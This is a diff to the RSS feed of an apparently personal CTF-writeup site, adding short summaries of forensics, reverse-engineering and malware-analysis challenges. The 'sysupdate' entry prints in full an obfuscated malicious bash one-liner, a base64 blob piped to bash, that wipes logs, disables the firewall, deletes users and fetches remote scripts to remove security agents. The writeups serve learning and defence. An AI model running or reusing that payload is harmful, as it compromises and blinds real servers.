@@ -17,6 +17,97 @@ An image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuff
 Open a website with recipe instructions.</description>
     </item>
     <item>
+      <title>Ancient Cave Vault - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/ancientcavevault/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/ancientcavevault/</guid>
+      <description>This is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:
+After the final wrong attempt, the executable closes:
+So how can we find the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .</description>
+    </item>
+    <item>
+      <title>Another malicious doc - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/anothermaliciousdoc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/anothermaliciousdoc/</guid>
+      <description>Upon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:
+Avoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:
+One way we can deobfuscate this is utilizing the ChatGPT AI service:
+Just by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.</description>
+    </item>
+    <item>
+      <title>captcha 4 humans - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/captcha4humans/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/captcha4humans/</guid>
+      <description>For this challenge you would normally fire up a docker instance that unfortunately you can&amp;rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!
+The concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string.</description>
+    </item>
+    <item>
+      <title>Chinese Windows Updater - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/chinesewindowsupgrader/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/chinesewindowsupgrader/</guid>
+      <description>Upon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:
+Moreover, the memory dump alone does not yield any useful insights.
+Therefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:
+Upon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.</description>
+    </item>
+    <item>
+      <title>Flag on the run - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/flagontherun/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/flagontherun/</guid>
+      <description>Unzipping the provided file, we extract the following files:
+This time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:
+So we will ignore this for now and open the provided “.pcap” file with Wireshark:
+This time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols.</description>
+    </item>
+    <item>
+      <title>Headstream - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/headstream/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/headstream/</guid>
+      <description>We&amp;rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named &amp;ldquo;GTAVI.exe&amp;rdquo;.
+Upon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:
+And after clicking the &amp;lsquo;OK&amp;rsquo; button:
+Since we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool.</description>
+    </item>
+    <item>
+      <title>Hinting flags - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/hintingflags/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/hintingflags/</guid>
+      <description>Extracting the contents of the zip file, we are met with a &amp;ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:
+Volatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.</description>
+    </item>
+    <item>
+      <title>Insider - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/insider/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/insider/</guid>
+      <description>The goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale. So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:
+A google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.</description>
+    </item>
+    <item>
+      <title>IRS went phishing - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/irswentphishing/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/irswentphishing/</guid>
+      <description>We are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.
+The goldfynch is the easier option so that’s what we are going to use:
+Opening the email, we view what seems to be a very sus message from presumably the IRS:
+An archive is provided to the victim with a password set to recover the form.</description>
+    </item>
+    <item>
+      <title>Malware Carving - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/malwarecarving/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/malwarecarving/</guid>
+      <description>We are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:
+Pagefile.sys is a system file in Windows set aside for your computer&amp;#39;s Random Access Memory (RAM), also known as physical memory. When your computer&amp;#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn&amp;#39;t need, such as files and apps.</description>
+    </item>
+    <item>
       <title>Mr Anderson - Writeup</title>
       <link>http://localhost:1313/ctfwriteups/mranderson/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -36,12 +127,46 @@ The request that is of interest is the one made to themrbeas7.org and is the fol
 GET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.</description>
     </item>
     <item>
+      <title>Showerpell - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/showerpell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/showerpell/</guid>
+      <description>In this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named &amp;ldquo;dnsexfil.ps1&amp;rdquo;. Using the option File &amp;ndash;&amp;gt; Export Objects &amp;ndash;&amp;gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File &amp;ndash;&amp;gt; Export Objects &amp;ndash;&amp;gt; HTTP.
+With the help of a text editor, we can open this powershell script and view its contents:</description>
+    </item>
+    <item>
+      <title>Sloppy Encryptor - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/sloppyencryptor/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/sloppyencryptor/</guid>
+      <description>This is a writeup for the sloppy encryptor challenge We are given an encrypted file containing unreadable text and the file used to produce it.
+The encrypted text is: jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii &amp;#39;&amp;#39;&amp;#39; The file that created it is: &amp;#39;&amp;#39;&amp;#39; from random import randint as rint from secret_stuff import FLAG def encrypt(FLAG): return &amp;#34;&amp;#34;.join([str(ord(c))+str(rint(126, 254)) for c in FLAG]) def toBytes(enc): return &amp;#34;&amp;#34;.join([chr(int(enc[i])+100) for i in range(len(enc))]) with open(&amp;#34;./flag.enc&amp;#34;,&amp;#34;w&amp;#34;) as f: enc = encrypt(FLAG) enc_ = toBytes(enc) f.</description>
+    </item>
+    <item>
+      <title>sysupdate - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/sysupdate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/sysupdate/</guid>
+      <description>In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:
+echo -n &amp;#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&amp;#34; | base64 -d | bash -s We see the script decodes a b64 string and then runs it by piping it to bash.
+Let&amp;rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it.</description>
+    </item>
+    <item>
+      <title>Upgrading Windows - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/upgradingwindows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/upgradingwindows/</guid>
+      <description>In this test, we are given a &amp;ldquo;.cmd&amp;rdquo; script whose purpose is to upgrade the user&amp;rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let&amp;rsquo;s analyze the file to see what we can find.
+We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution.</description>
+    </item>
+    <item>
       <title>Weak Legacy - Writeup</title>
       <link>http://localhost:1313/ctfwriteups/weaklegacy/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>http://localhost:1313/ctfwriteups/weaklegacy/</guid>
       <description>Based on the description of the challenge, we need to decrypt some messages that seem to be encrypted.
-Pcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:</description>
+Pcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:
+We can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged.</description>
     </item>
   </channel>
 </rss>
